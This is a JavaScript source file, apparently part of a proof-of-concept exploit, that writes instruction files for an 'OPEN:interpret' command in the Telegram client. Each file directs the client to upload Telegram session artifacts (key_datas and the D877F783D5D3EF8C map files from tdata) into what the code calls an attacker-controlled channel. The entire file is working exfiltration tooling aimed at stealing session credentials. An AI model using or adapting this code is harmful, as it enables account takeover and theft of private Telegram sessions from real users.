// Generates the instruction files consumed by the OPEN:interpret
// command. Each file instructs the client to upload one artifact
// from the tdata directory into the attacker-controlled channel.

const fs = require('fs');
const path = require('path');
const config = require('./config');

// One instruction file per stolen artifact.
// `file` is relative to Telegram's working directory, or absolute.
const DEFAULT_TARGETS = [
  { name: 'instructions1.txt', file: `${config.tdataPrefix}/key_datas`, caption: 'poc1' },
  { name: 'instructions2.txt', file: `${config.tdataPrefix}/D877F783D5D3EF8Cs`, caption: 'poc2' },
  { name: 'instructions3.txt', file: `${config.tdataPrefix}/D877F783D5D3EF8C/maps`, caption: 'poc3' },
];

function renderInstruction({ channelId, file, caption }) {
  return `channel: ${channelId}\nfile: ${file}\ncaption: ${caption}\n`;
}

function writeInstructions(outDir, targets = DEFAULT_TARGETS) {
  if (!config.channelId) {
    throw new Error('CHANNEL_ID is not set — configure .env first');
  }

  fs.mkdirSync(outDir, { recursive: true });

  return targets.map((target) => {
    const body = renderInstruction({
      channelId: config.channelId,
      file: target.file,
      caption: target.caption,
    });
    const dest = path.join(outDir, target.name);
    // ASCII, LF line endings, no BOM — matches what the client expects.
    fs.writeFileSync(dest, body, { encoding: 'ascii' });
    return { dest, body };
  });
}

module.exports = { DEFAULT_TARGETS, renderInstruction, writeInstructions };
